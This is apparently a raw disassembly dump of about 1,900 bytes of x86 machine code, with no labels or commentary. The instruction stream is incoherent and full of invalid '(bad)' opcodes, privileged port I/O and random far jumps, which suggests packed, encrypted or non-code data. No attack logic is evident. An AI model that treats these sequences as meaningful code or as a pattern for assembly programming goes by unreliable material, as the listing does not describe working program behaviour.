  41749e:	pusha  
  41749f:	cld    
  4174a0:	or     bh,BYTE PTR [eax-0x56]
  4174a3:	jne    0x417518
  4174a5:	lea    ebp,ds:0xb2bbdba8
  4174ab:	paddsw mm7,QWORD PTR [ecx]
  4174ae:	js     0x417495
  4174b0:	xor    eax,esi
  4174b2:	out    dx,eax
  4174b3:	mov    dh,0x4d
  4174b5:	call   0xf950:0x2e343778
  4174bc:	pushf  
  4174bd:	retf   0x115d
  4174c0:	pop    ds
  4174c1:	add    cl,BYTE PTR [esi+0x7]
  4174c4:	aaa    
  4174c5:	sbb    al,BYTE PTR [esi+0x2e]
  4174c8:	and    BYTE PTR [esi],al
  4174ca:	xor    bl,al
  4174cc:	rcr    DWORD PTR [edx-0x601e6366],1
  4174d2:	and    BYTE PTR [eax-0x47],al
  4174d5:	iret   
  4174d6:	jbe    0x417548
  4174d8:	push   edx
  4174d9:	out    0x92,al
  4174db:	scas   al,BYTE PTR es:[edi]
  4174dc:	shl    BYTE PTR [ebp+0x54],0xb9
  4174e0:	inc    ebx
  4174e1:	mov    BYTE PTR [edx],cl
  4174e3:	dec    edi
  4174e4:	xlat   BYTE PTR ds:[ebx]
  4174e5:	sub    DWORD PTR [ebx-0x77],ebx
  4174e8:	repz stc 
  4174ea:	outs   dx,BYTE PTR ds:[esi]
  4174eb:	mov    ch,0x8a
  4174ed:	push   0xffffffe1
  4174ef:	push   ecx
  4174f0:	jb     0x4174d1
  4174f2:	push   esp
  4174f3:	out    0xa,eax
  4174f5:	mov    bh,0x2b
  4174f7:	retf   
  4174f8:	push   ebx
  4174f9:	popa   
  4174fa:	test   eax,0xb7ed17b7
  4174ff:	xor    bl,al
  417501:	(bad)  
  417502:	lea    eax,[esi+eiz*2]
  417505:	cs xchg edx,eax
  417507:	xchg   ecx,eax
  417508:	and    ebx,esp
  41750a:	call   0xbd8c:0x754ce539
  417511:	sbb    eax,0xe23f6e19
  417516:	xor    BYTE PTR [ecx-0x231232f7],ah
  41751c:	frstor [eax]
  41751e:	test   al,0xf9
  417520:	pop    esi
  417521:	add    eax,DWORD PTR ds:0x8cc7b48f
  417527:	ds scas al,BYTE PTR es:[edi]
  417529:	imul   esi,DWORD PTR [ebx+0x7d],0x1
  41752d:	je     0x417535
  41752f:	dec    eax
  417530:	in     al,0xee
  417532:	or     DWORD PTR [edx+eax*2],eax
  417535:	adc    bh,BYTE PTR [edx]
  417537:	xchg   ah,ah
  417539:	adc    BYTE PTR [esi-0x4f],bl
  41753c:	cli    
  41753d:	mov    dl,0xcf
  41753f:	pop    esp
  417540:	dec    esi
  417541:	mov    BYTE PTR cs:[edi-0x7b3e589f],cl
  417548:	cdq    
  417549:	xor    ebx,DWORD PTR [ebp-0x2c]
  41754c:	mov    bh,0x23
  41754e:	test   ebx,esi
  417550:	leave  
  417551:	mov    ebp,0xaf9aec53
  417556:	dec    ecx
  417557:	pop    DWORD PTR [ebx+0x2346ec57]
  41755d:	in     eax,0x3c
  41755f:	mov    bh,0x77
  417561:	cmp    DWORD PTR [edx+0x55a0910d],edi
  417567:	push   cs
  417568:	lea    edi,[esi+ebx*2-0x5ba58414]
  41756f:	outs   dx,DWORD PTR ds:[esi]
  417570:	and    dh,BYTE PTR [esi-0x52be4b49]
  417576:	adc    al,0x5c
  417578:	sbb    DWORD PTR [ecx+ebx*1+0x77],edi
  41757c:	xchg   ebx,eax
  41757d:	push   0x56
  41757f:	push   esi
  417580:	add    al,BYTE PTR [edi]
  417582:	xchg   ecx,eax
  417583:	mov    esi,0x59bd42f7
  417588:	jg     0x417520
  41758a:	popf   
  41758b:	loop   0x417579
  41758d:	xchg   BYTE PTR [edx+edi*1],cl
  417590:	out    0x2e,eax
  417592:	jno    0x41754e
  417594:	stos   BYTE PTR es:[edi],al
  417595:	adc    al,dl
  417597:	mov    ds:0xd4218116,al
  41759c:	push   ecx
  41759d:	mov    ecx,0x36052ca4
  4175a2:	and    eax,0x3a7e5dc
  4175a7:	or     ecx,DWORD PTR [ecx+0x7f]
  4175aa:	(bad)  
  4175ab:	jge    0x41752d
  4175ad:	(bad)  
  4175ae:	repz pop edx
  4175b0:	sub    esi,DWORD PTR [ecx-0x42c7d403]
  4175b6:	fadd   QWORD PTR [esi+0x472d8976]
  4175bc:	sub    al,0x11
  4175be:	lock sti 
  4175c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175c1:	icebp  
  4175c2:	mov    eax,0x60105bf1
  4175c7:	or     bh,dh
  4175c9:	mov    ds:0xb375b8a9,eax
  4175ce:	lods   al,BYTE PTR ds:[esi]
  4175cf:	add    esi,edi
  4175d1:	jne    0x4175fd
  4175d3:	aam    0x1d
  4175d5:	add    bh,0x9d
  4175d8:	nop
  4175d9:	rcr    BYTE PTR [eax],cl
  4175db:	jl     0x4175eb
  4175dd:	mov    ds:0xa706978f,al
  4175e2:	(bad)  
  4175e3:	jle    0x417645
  4175e5:	cmp    ah,BYTE PTR [edi+0x5016b49b]
  4175eb:	push   edx
  4175ec:	mov    edi,0x6c666bc8
  4175f1:	ss mov bl,0xd8
  4175f4:	lds    esp,FWORD PTR [eax]
  4175f6:	inc    esp
  4175f7:	push   esp
  4175f8:	mov    ds:0xeec7e760,eax
  4175fd:	inc    ax
  4175ff:	jmp    0xeb42:0xb8c83b7c
  417606:	fisubr WORD PTR [edi+0x37736400]
  41760c:	xchg   ecx,eax
  41760d:	shl    dl,1
  41760f:	sbb    ebp,0xd0277d29
  417615:	loop   0x4175aa
  417617:	int    0xaf
  417619:	add    DWORD PTR [edi+0x5d],eax
  41761c:	push   es
  41761d:	mov    esi,0x484386d7
  417622:	rol    BYTE PTR [edi-0x1e],cl
  417625:	gs in  eax,0xf1
  417628:	and    eax,0x77cfa8e
  41762d:	leavew 
  41762f:	adc    al,0x81
  417631:	dec    edi
  417632:	add    BYTE PTR [esi+ecx*2],ah
  417635:	(bad)  [esi+0x3]
  417638:	sub    eax,0x36d5e32c
  41763d:	repnz xchg ecx,eax
  41763f:	sbb    DWORD PTR [edx],ecx
  417641:	ja     0x41761d
  417643:	repz mov eax,ds:0xfa1acc41
  417649:	and    eax,0xe51d9247
  41764e:	mov    bl,0xe
  417650:	icebp  
  417651:	and    BYTE PTR ds:0xc4ce8681,bl
  417657:	test   BYTE PTR [ebx],bl
  417659:	push   ebp
  41765a:	pop    edi
  41765b:	sub    al,0x3b
  41765d:	jbe    0x41764f
  41765f:	add    bl,BYTE PTR [eax+0x65]
  417662:	ror    edi,cl
  417664:	rcr    DWORD PTR [edx-0x6fd80a34],1
  41766a:	cmp    eax,0xffd8c19b
  41766f:	loopne 0x41764a
  417671:	repnz ins BYTE PTR es:[edi],dx
  417673:	sub    ebp,eax
  417675:	dec    eax
  417676:	jns    0x417657
  417678:	sbb    al,0x12
  41767a:	sahf   
  41767b:	mov    ?,WORD PTR [edi-0x31]
  41767e:	or     eax,0x3f817a29
  417683:	xchg   esp,eax
  417684:	sar    BYTE PTR [ebx+0x40d0b103],0xbf
  41768b:	cmp    al,0x6e
  41768d:	pop    ebp
  41768e:	(bad)  
  41768f:	scas   eax,DWORD PTR es:[edi]
  417690:	xchg   edx,eax
  417691:	mov    eax,0x7d60e6d9
  417696:	hlt    
  417697:	sub    esi,DWORD PTR [ecx]
  417699:	int3   
  41769a:	push   ds
  41769b:	repnz add al,0xb0
  41769e:	lea    edi,[ebx-0xa]
  4176a1:	(bad)  
  4176a2:	push   ss
  4176a3:	or     eax,0xb9980019
  4176a8:	bound  esp,QWORD PTR [edx-0x75fa3fd9]
  4176ae:	call   0x93d4a822
  4176b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176b4:	out    0x0,eax
  4176b6:	retf   
  4176b7:	push   ebx
  4176b8:	lahf   
  4176b9:	add    esi,edx
  4176bb:	addr16 clc 
  4176bd:	and    cl,BYTE PTR [esi+0x68]
  4176c0:	xor    eax,0x6d7c1668
  4176c5:	mov    dl,0x93
  4176c7:	jo     0x417693
  4176c9:	out    0xcb,eax
  4176cb:	sbb    eax,0x6cc71c
  4176d0:	push   esp
  4176d1:	pop    esi
  4176d2:	add    DWORD PTR [esi],ebx
  4176d4:	ins    BYTE PTR es:[edi],dx
  4176d5:	je     0x4176a4
  4176d7:	mov    edi,0x8ea7c6b5
  4176dc:	push   cs
  4176dd:	repz xor eax,0x2139a08d
  4176e3:	mov    ds:0xb51f8b0f,eax
  4176e8:	jecxz  0x4176f5
  4176ea:	(bad)  
  4176eb:	js     0x4176a9
  4176ed:	lods   al,BYTE PTR ds:[esi]
  4176ee:	aas    
  4176ef:	sar    eax,1
  4176f1:	addr16 daa 
  4176f3:	test   eax,0xb9cc7552
  4176f8:	in     eax,dx
  4176f9:	imul   ecx,esp,0x1794b6f6
  4176ff:	aaa    
  417700:	in     al,0xf0
  417702:	mov    esi,0xd42b2398
  417707:	xchg   esi,eax
  417708:	jl     0x4176af
  41770a:	adc    eax,0x1ba49b97
  41770f:	or     edx,eax
  417711:	(bad)  
  417712:	iret   
  417713:	mov    ah,0x86
  417715:	rol    DWORD PTR [ebx],1
  417717:	pop    edx
  417718:	mov    al,ds:0x6e7e0f91
  41771d:	scas   eax,DWORD PTR es:[edi]
  41771e:	lods   eax,DWORD PTR ds:[esi]
  41771f:	jno    0x417783
  417721:	fsub   DWORD PTR [ebp+ebp*1-0x3cbe41a9]
  417728:	loopne 0x417741
  41772a:	retf   0xe8ce
  41772d:	sbb    BYTE PTR [esi+0x13802516],bl
  417733:	mov    al,0x77
  417735:	sbb    ebx,edx
  417737:	retf   0x58d4
  41773a:	mov    ch,0xcb
  41773c:	call   0xd290f68d
  417741:	fimul  DWORD PTR ds:0x380ff676
  417747:	cmp    DWORD PTR [edx+0x6241f277],0x719773e7
  417751:	es jno 0x41770e
  417754:	jg     0x417749
  417756:	sbb    edx,edi
  417758:	or     bh,BYTE PTR [edi+0x23]
  41775b:	mov    edi,DWORD PTR gs:[esi-0x5]
  41775f:	fild   DWORD PTR [edi-0x75a4abfa]
  417765:	adc    eax,0x4f7cda0b
  41776a:	inc    ebx
  41776b:	pop    eax
  41776c:	ds popa 
  41776e:	aas    
  41776f:	jecxz  0x417734
  417771:	jmp    0x4177a8
  417773:	sbb    al,0x7a
  417775:	icebp  
  417776:	pop    eax
  417777:	stc    
  417778:	or     edx,DWORD PTR [ebp-0x30]
  41777b:	mov    esi,0x559d351c
  417780:	test   ecx,0x8210bb68
  417786:	xchg   edx,eax
  417787:	inc    eax
  417788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417789:	(bad)  
  41778a:	stc    
  41778b:	sbb    al,0xa5
  41778d:	mov    bl,0x65
  41778f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417790:	add    BYTE PTR [edi-0xb0ee349],bl
  417796:	xchg   ebp,eax
  417797:	xchg   esp,eax
  417798:	push   ecx
  417799:	xchg   esi,eax
  41779a:	fs nop
  41779c:	in     al,0x38
  41779e:	(bad)  
  41779f:	imul   edi,DWORD PTR [ecx],0xffffffa8
  4177a2:	je     0x41780b
  4177a4:	das    
  4177a5:	stos   BYTE PTR es:[edi],al
  4177a6:	and    eax,0xe43e5a8f
  4177ab:	push   ebx
  4177ac:	cmp    ecx,DWORD PTR [ebp+0x6c96a1a9]
  4177b2:	int    0x3b
  4177b4:	not    BYTE PTR [edi+esi*4]
  4177b7:	into   
  4177b8:	sub    BYTE PTR [edx+0x7a],dh
  4177bb:	sub    eax,0xca62ffa8
  4177c0:	out    0x6b,al
  4177c2:	push   ebx
  4177c3:	inc    esp
  4177c4:	inc    edi
  4177c5:	jo     0x417758
  4177c7:	test   eax,0xf6c63ac9
  4177cc:	push   0x7e
  4177ce:	js     0x4177c9
  4177d0:	dec    edx
  4177d1:	popf   
  4177d2:	push   edx
  4177d3:	sub    al,0xc1
  4177d5:	imul   eax,DWORD PTR [eax+eax*8+0x391e4b6a],0x29
  4177dd:	mov    bl,0x2c
  4177df:	cli    
  4177e0:	aam    0x96
  4177e2:	mul    edi
  4177e4:	cld    
  4177e5:	aam    0xec
  4177e7:	(bad)  
  4177e8:	pop    esi
  4177e9:	cwde   
  4177ea:	lods   al,BYTE PTR ds:[esi]
  4177eb:	add    eax,0xdf1bc7c4
  4177f0:	or     ebx,esp
  4177f2:	jecxz  0x41777e
  4177f4:	pop    ebx
  4177f5:	in     al,dx
  4177f6:	out    dx,al
  4177f7:	lock adc al,0xb5
  4177fa:	pop    esp
  4177fb:	ins    DWORD PTR es:[edi],dx
  4177fc:	fmul   QWORD PTR [edx]
  4177fe:	mov    DWORD PTR [eax-0xc3b93a9],edi
  417804:	sub    al,0xf3
  417806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417807:	jmp    0xb01e823e
  41780c:	pop    edi
  41780d:	mov    dl,0xbb
  41780f:	pop    esp
  417810:	call   0x6b04:0xb9c85af2
  417817:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417818:	jo     0x417844
  41781a:	pop    ebp
  41781b:	shr    DWORD PTR [eax+0x1f],0x8
  41781f:	xchg   DWORD PTR [ecx+edi*1],edi
  417822:	shl    DWORD PTR [ebp-0xa],0x7a
  417826:	stos   DWORD PTR es:[edi],eax
  417827:	lds    edi,FWORD PTR [edi]
  417829:	sub    eax,0xa2938313
  41782e:	adc    BYTE PTR [esi+0x5f3f58e5],dh
  417834:	arpl   ax,ax
  417836:	mov    al,0x78
  417838:	or     ch,BYTE PTR [eax+0x7c]
  41783b:	(bad)  
  41783c:	cli    
  41783d:	shl    DWORD PTR [eax+esi*4-0x17],0xfd
  417842:	es cli 
  417844:	cmp    DWORD PTR [ebx+edi*1-0x50],eax
  417848:	mov    al,0x95
  41784a:	mov    ebx,0x4f382947
  41784f:	cs cmp edx,0x8af07c1d
  417856:	nop
  417857:	icebp  
  417858:	in     eax,dx
  417859:	int3   
  41785a:	pop    edi
  41785b:	int3   
  41785c:	jnp    0x41782c
  41785e:	cld    
  41785f:	and    cl,cl
  417861:	ins    DWORD PTR es:[edi],dx
  417862:	mov    eax,0x5c631eeb
  417867:	rcr    ecx,cl
  417869:	sbb    DWORD PTR [eax+0x2c],esp
  41786c:	je     0x417857
  41786e:	ds cli 
  417870:	jne    0x4178dd
  417872:	(bad)  
  417873:	(bad)  
  417874:	push   esp
  417875:	adc    ebx,0x24a260e8
  41787b:	(bad)  [esi]
  41787d:	fisttp QWORD PTR [eax-0x11]
  417880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417881:	push   ds
  417882:	pop    esp
  417883:	ins    DWORD PTR es:[edi],dx
  417884:	pop    edi
  417885:	stos   DWORD PTR es:[edi],eax
  417886:	pusha  
  417887:	pop    edi
  417888:	mov    ds:0x252f2000,eax
  41788d:	nop
  41788e:	aam    0xf5
  417890:	xlat   BYTE PTR ds:[ebx]
  417891:	daa    
  417892:	xchg   BYTE PTR [esi+0x10b11775],dh
  417898:	mov    WORD PTR [edi-0x13],fs
  41789b:	aad    0x8f
  41789d:	inc    esp
  41789e:	pop    ds
  41789f:	enter  0x9e4d,0x59
  4178a3:	je     0x4178cc
  4178a5:	cld    
  4178a6:	pop    edx
  4178a7:	rcl    DWORD PTR ds:0xe3f6457f,1
  4178ad:	outs   dx,DWORD PTR ds:[esi]
  4178ae:	(bad)  
  4178af:	std    
  4178b0:	jmp    0x9035:0x8e08c759
  4178b7:	inc    ebx
  4178b8:	retf   
  4178b9:	sbb    cl,cl
  4178bb:	push   ebx
  4178bc:	jp     0x4178d0
  4178be:	mov    eax,0x52f11703
  4178c3:	dec    eax
  4178c4:	xchg   ebx,eax
  4178c5:	adc    al,BYTE PTR [ebx+0x4af5e01]
  4178cb:	call   0x3393cc17
  4178d0:	push   0xffffffe1
  4178d2:	jno    0x417895
  4178d4:	not    DWORD PTR [ecx+0x79]
  4178d7:	inc    eax
  4178d8:	out    dx,eax
  4178d9:	jecxz  0x417925
  4178db:	jns    0x4178cf
  4178dd:	into   
  4178de:	or     ebp,eax
  4178e0:	in     eax,0x25
  4178e2:	sub    esi,eax
  4178e4:	enter  0xd2d3,0x72
  4178e8:	sar    ah,1
  4178ea:	dec    edi
  4178eb:	cwde   
  4178ec:	xlat   BYTE PTR ds:[ebx]
  4178ed:	inc    edi
  4178ee:	fist   WORD PTR [ebx+0x1e24542c]
  4178f4:	pop    edx
  4178f5:	adc    eax,0x44b379fb
  4178fa:	cmp    ch,dl
  4178fc:	xchg   ecx,eax
  4178fd:	jmp    0x9b7fda5d
  417902:	jo     0x41795a
  417904:	xor    bh,BYTE PTR [edx]
  417906:	xchg   edi,eax
  417907:	pop    ds
  417908:	jae    0x41791c
  41790a:	sub    bh,BYTE PTR [eax-0x1d]
  41790d:	fistp  DWORD PTR ds:0xd184c23
  417913:	int3   
  417914:	push   eax
  417915:	mov    edi,0x7a48a8c8
  41791a:	cli    
  41791b:	aas    
  41791c:	adc    BYTE PTR [ebp-0x6],cl
  41791f:	sbb    BYTE PTR [esi-0x5d],al
  417922:	push   edx
  417923:	aam    0x5f
  417925:	cmp    dh,BYTE PTR [esi+0x70a99b3f]
  41792b:	xchg   ecx,eax
  41792c:	out    0x13,al
  41792e:	jo     0x417930
  417930:	xchg   DWORD PTR [eax-0x53456ab6],edx
  417936:	dec    edi
  417937:	scas   eax,DWORD PTR es:[edi]
  417938:	sar    DWORD PTR [edx+0x34901d23],0x3c
  41793f:	and    BYTE PTR [ecx+ebp*1],bl
  417942:	xchg   edi,eax
  417943:	clc    
  417944:	or     BYTE PTR [edi+0x29f658fc],bl
  41794a:	rcr    al,1
  41794c:	mov    bh,0x10
  41794e:	stc    
  41794f:	push   ebx
  417950:	push   DWORD PTR [edx]
  417952:	mov    dh,0xb9
  417954:	xchg   ebp,eax
  417955:	add    al,BYTE PTR [eax-0x18]
  417958:	int3   
  417959:	dec    eax
  41795a:	(bad)  
  41795b:	ss retf 0x5b67
  41795f:	jbe    0x4178f9
  417961:	inc    ecx
  417962:	adc    al,BYTE PTR [eax]
  417964:	int    0x83
  417966:	ret    
  417967:	loop   0x4179ac
  417969:	inc    ebx
  41796a:	clc    
  41796b:	(bad)  
  41796c:	mov    ecx,0x7fd1c3b0
  417971:	jl     0x417939
  417973:	push   ecx
  417974:	nop
  417975:	adc    DWORD PTR [esi+0x19e0ad19],0xd3ecb968
  41797f:	je     0x41794d
  417981:	sub    eax,0x520bc5b3
  417986:	xor    eax,0x882f1ad3
  41798b:	lea    edi,[ebp-0x37beac84]
  417991:	(bad)  
  417992:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417993:	mul    cl
  417995:	sbb    dh,bh
  417997:	inc    edx
  417998:	ss xchg ecx,eax
  41799a:	cmp    bh,BYTE PTR [eax+0x1e0adf9f]
  4179a0:	add    DWORD PTR [edi],0x74d76c56
  4179a6:	cmp    DWORD PTR [edi+0x67],0xffffffdb
  4179aa:	cdq    
  4179ab:	sub    DWORD PTR [ecx+0x6e],ebp
  4179ae:	dec    ebx
  4179af:	jmp    0x4179e4
  4179b1:	scas   eax,DWORD PTR es:[edi]
  4179b2:	pop    esp
  4179b3:	fs (bad) 
  4179b5:	loop   0x41797b
  4179b7:	sbb    cl,BYTE PTR [eax]
  4179b9:	out    dx,eax
  4179ba:	mov    esi,0x53d149a8
  4179bf:	inc    edx
  4179c0:	pop    ecx
  4179c1:	and    BYTE PTR [ecx-0x7f],0xce
  4179c5:	jae    0x417984
  4179c7:	push   ecx
  4179c8:	mov    cs:0x70a238ac,al
  4179ce:	ins    DWORD PTR es:[edi],dx
  4179cf:	dec    esp
  4179d0:	call   0x62fb:0x32929438
  4179d7:	push   eax
  4179d8:	add    al,0x5d
  4179da:	fst    st(4)
  4179dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179dd:	es iret 
  4179df:	(bad)  
  4179e0:	fsubr  st,st(2)
  4179e2:	stos   DWORD PTR es:[edi],eax
  4179e3:	and    BYTE PTR [edi],0x1d
  4179e6:	in     eax,dx
  4179e7:	sub    BYTE PTR [eax],bl
  4179e9:	and    dl,al
  4179eb:	and    dl,BYTE PTR ss:[edx]
  4179ee:	xor    DWORD PTR [eax-0x7b5b6fce],0xffffffc2
  4179f5:	mul    BYTE PTR [ebx]
  4179f7:	in     eax,0x2d
  4179f9:	add    ecx,DWORD PTR [esi]
  4179fb:	push   es
  4179fc:	xchg   ecx,eax
  4179fd:	cmp    BYTE PTR [ecx],0xd1
  417a00:	sub    al,0x74
  417a02:	ret    0x4d05
  417a05:	push   ecx
  417a06:	pop    ecx
  417a07:	out    0x74,al
  417a09:	outs   dx,BYTE PTR ds:[esi]
  417a0a:	sub    DWORD PTR [esi],0xffffffbf
  417a0d:	in     al,0xa
  417a0f:	pop    edx
  417a10:	je     0x417a1a
  417a12:	stos   BYTE PTR es:[edi],al
  417a13:	daa    
  417a14:	xchg   ecx,eax
  417a15:	dec    esp
  417a16:	int    0x17
  417a18:	push   0x7f22df25
  417a1d:	cs jbe 0x4179dd
  417a20:	adc    al,0xc5
  417a22:	cmp    al,0x77
  417a24:	daa    
  417a25:	and    BYTE PTR [esi+0x38],bh
  417a28:	cdq    
  417a29:	xor    cl,cl
  417a2b:	mov    al,ds:0xdcc00a3e
  417a30:	push   esi
  417a31:	xchg   esi,eax
  417a32:	add    eax,0xf0400a5f
  417a37:	out    dx,al
  417a38:	push   edi
  417a39:	adc    ebp,DWORD PTR [edi+0x62]
  417a3c:	dec    ecx
  417a3d:	js     0x417a1b
  417a3f:	xor    al,0x91
  417a41:	mov    dh,0x71
  417a43:	ret    
  417a44:	sbb    DWORD PTR [ecx-0xd],esp
  417a47:	mov    dh,0xaa
  417a49:	cmp    BYTE PTR [edi+0x46bf8fe4],cl
  417a4f:	pop    ss
  417a50:	push   edi
  417a51:	mov    esi,ebx
  417a53:	mov    ebp,0xc5b6f2bf
  417a58:	sub    al,0x4d
  417a5a:	jbe    0x417a8f
  417a5c:	lods   eax,DWORD PTR ds:[esi]
  417a5d:	cmp    DWORD PTR [edx+0x1a],0xffffffe4
  417a61:	add    esi,ebp
  417a63:	arpl   WORD PTR [ecx+0x416ceab4],bx
  417a69:	stc    
  417a6a:	popa   
  417a6b:	jb     0x417a3b
  417a6d:	nop
  417a6e:	jae    0x417ae0
  417a70:	shl    DWORD PTR cs:[edi+eiz*1+0x72],1
  417a75:	mov    esp,0x111c2793
  417a7a:	pop    edx
  417a7b:	retf   
  417a7c:	rcl    DWORD PTR ds:[ebx],1
  417a7f:	fwait
  417a80:	out    0x14,eax
  417a82:	mov    ebx,0xd83f6ba4
  417a87:	rcl    DWORD PTR [edx],0xf9
  417a8a:	(bad)  
  417a8b:	mov    esi,0x936aebe
  417a90:	hlt    
  417a91:	push   edx
  417a92:	test   DWORD PTR [edi],ebp
  417a94:	jge    0x417a9b
  417a96:	push   0xc63d8418
  417a9b:	or     eax,ebp
  417a9d:	loope  0x417adf
  417a9f:	rcl    DWORD PTR [ecx+0x4153fd7d],1
  417aa5:	push   0xffffffb8
  417aa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417aa8:	mov    BYTE PTR [ecx+0x6228ba6c],0x7f
  417aaf:	and    al,0xc7
  417ab1:	sahf   
  417ab2:	gs xchg ebp,eax
  417ab4:	adc    ch,ah
  417ab6:	lahf   
  417ab7:	rol    DWORD PTR [eax-0x2c],0x31
  417abb:	adc    ecx,esi
  417abd:	imul   edx,DWORD PTR [eax],0xe1a01f2
  417ac3:	repz add BYTE PTR [eax-0x4],0xf1
  417ac8:	cld    
  417ac9:	rep ins BYTE PTR es:[edi],dx
  417acb:	leave  
  417acc:	repnz push eax
  417ace:	add    esi,DWORD PTR [esi+0x2]
  417ad1:	and    ah,BYTE PTR [edx-0xfb37785]
  417ad7:	xor    DWORD PTR es:[ecx-0x42],esp
  417adb:	lahf   
  417adc:	retf   
  417add:	iret   
  417ade:	push   ecx
  417adf:	iret   
  417ae0:	into   
  417ae1:	sahf   
  417ae2:	pop    esi
  417ae3:	pop    ds
  417ae4:	jmp    0xe7708bf1
  417ae9:	mul    BYTE PTR [ecx-0xe]
  417aec:	test   BYTE PTR [edi-0x66dc020e],ch
  417af2:	sbb    BYTE PTR [edi],al
  417af4:	jbe    0x417ac1
  417af6:	inc    edx
  417af7:	mov    dl,0x5b
  417afa:	mov    ds:0xf9d01ba7,eax
  417aff:	jne    0x417aed
  417b01:	les    edx,FWORD PTR [ebx]
  417b03:	ret    
  417b04:	cmp    al,0x58
  417b06:	(bad)  
  417b07:	imul   edi,DWORD PTR [ebx+0x6c],0xffffffda
  417b0b:	retf   
  417b0c:	mov    ebp,eax
  417b0e:	movlps xmm0,QWORD PTR [ebx-0x67]
  417b12:	cmp    al,0x3
  417b14:	inc    edi
  417b15:	mov    bl,0xd9
  417b17:	and    al,0xea
  417b19:	lods   al,BYTE PTR ds:[esi]
  417b1a:	mov    ecx,0x2a8915c0
  417b1f:	aas    
  417b20:	imul   ebx,DWORD PTR [eax-0x30],0x608e111
  417b27:	rol    esp,1
  417b29:	lods   eax,DWORD PTR ds:[esi]
  417b2a:	inc    edi
  417b2b:	pop    edi
  417b2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b2d:	jo     0x417b26
  417b2f:	dec    esi
  417b30:	std    
  417b31:	das    
  417b32:	icebp  
  417b33:	mov    bl,BYTE PTR [edx+eiz*1+0x3ab0dad7]
  417b3a:	sti    
  417b3b:	dec    edx
  417b3c:	pop    eax
  417b3d:	adc    eax,DWORD PTR [ebx+0x1d72a3c6]
  417b43:	jae    0x417b23
  417b45:	mov    ss,WORD PTR [esi+edi*8-0x3]
  417b49:	repz jbe 0x417ae0
  417b4c:	xor    edx,edi
  417b4e:	mov    edx,0x4571999b
  417b53:	fiadd  WORD PTR [ecx-0x59]
  417b56:	scas   al,BYTE PTR es:[edi]
  417b57:	jge    0x417b86
  417b59:	retf   0xb714
  417b5c:	add    eax,0x39380c43
  417b61:	fdiv   st,st(0)
  417b63:	and    DWORD PTR [eax],0xffffff99
  417b66:	and    BYTE PTR [ecx-0xd76520a],0xb9
  417b6d:	sub    al,bh
  417b6f:	dec    ecx
  417b70:	gs push esi
  417b72:	mov    eax,ds:0xcf53c84
  417b77:	mov    cl,0x4f
  417b79:	into   
  417b7a:	adc    ecx,DWORD PTR [ebx+0x19259a27]
  417b80:	je     0x417baf
  417b82:	cdq    
  417b83:	and    al,0xba
  417b85:	cwde   
  417b86:	(bad)
  417b89:	lahf   
  417b8a:	or     ebp,ecx
  417b8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b8d:	adc    al,0x1b
  417b8f:	scas   eax,DWORD PTR es:[edi]
  417b90:	cli    
  417b91:	test   BYTE PTR [ebx+0x69b66707],dl
  417b97:	jge    0x417ba2
  417b99:	scas   eax,DWORD PTR es:[edi]
  417b9a:	daa    
  417b9b:	jnp    0x417b48
  417b9d:	in     al,dx
  417b9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b9f:	test   eax,0xbdce8fbf
  417ba4:	scas   eax,DWORD PTR es:[edi]
  417ba5:	xor    DWORD PTR [edi],0x18
  417ba8:	nop
  417ba9:	or     esp,DWORD PTR [esi-0x235eac71]
  417baf:	push   ebp
  417bb1:	pop    eax
  417bb2:	fistp  QWORD PTR [esi+0x6cf1e902]
  417bb8:	jnp    0x417b3d
  417bba:	jl     0x417ba4
  417bbc:	mov    BYTE PTR [edi],dh
  417bbe:	out    dx,eax
  417bbf:	mov    cl,0xb
  417bc1:	mov    edx,0xc5a3233
  417bc6:	and    BYTE PTR [ebx+eiz*8],dl
  417bc9:	mov    DWORD PTR [eax],edi
  417bcb:	sub    al,0x20
  417bcd:	jp     0x417c48
  417bcf:	pop    esp
  417bd0:	pusha  
  417bd1:	cmp    al,0x40
  417bd3:	inc    edi
  417bd4:	fadd   DWORD PTR [ebx+ebx*8-0x5f750326]
  417bdb:	loopne 0x417bce
  417bdd:	mov    edx,0x77000823
  417be2:	xor    eax,0x9e686db6
  417be7:	mov    bl,0x5
  417be9:	mov    ebx,0x359a58c0
  417bee:	cmp    esp,ebx
  417bf0:	cdq    
  417bf1:	or     al,0xa4
  417bf3:	add    ebp,DWORD PTR [esi-0x10877367]
  417bf9:	mov    dl,0x5b
  417bfb:	clc    
  417bfc:	or     al,0xe2
  417bfe:	inc    BYTE PTR [edx+0x1b]
  417c01:	popa   
  417c02:	adc    esi,DWORD PTR [ecx-0x1ecdcd43]
  417c08:	shr    BYTE PTR fs:[ebx],0x1d
  417c0c:	fcmovnu st,st(3)
  417c0e:	sbb    ah,dl
  417c10:	add    DWORD PTR [esi+0x45],ecx
  417c13:	mov    al,0x62
  417c15:	jg     0x417beb
  417c17:	xchg   ebx,eax
  417c18:	std    
  417c19:	dec    edx
  417c1a:	aaa    
  417c1b:	cmp    ch,bl
  417c1d:	sub    edi,ebp
  417c1f:	jmp    0xd767:0x54917415
  417c26:	xor    BYTE PTR [edx+eiz*4+0x6b016edd],cl
  417c2d:	test   DWORD PTR [ebx+0x38],ebp
  417c30:	xlat   BYTE PTR ds:[ebx]
  417c31:	sti    
  417c32:	xchg   ebx,eax
  417c33:	daa    
  417c34:	mov    ecx,0xc5ea6564
  417c39:	(bad)  [edx+edi*2+0x7f4354ab]
  417c40:	fistp  WORD PTR [esi-0x6702e783]
  417c46:	and    bh,bl
  417c48:	sbb    dl,BYTE PTR [ebx-0x13]
  417c4b:	xor    DWORD PTR [eax+0x2813f1b8],esi
  417c51:	xlat   BYTE PTR ds:[ebx]
  417c52:	xor    eax,0x8cb40001
  417c57:	cwde   
  417c58:	dec    ecx
  417c59:	inc    edx
  417c5a:	in     al,dx
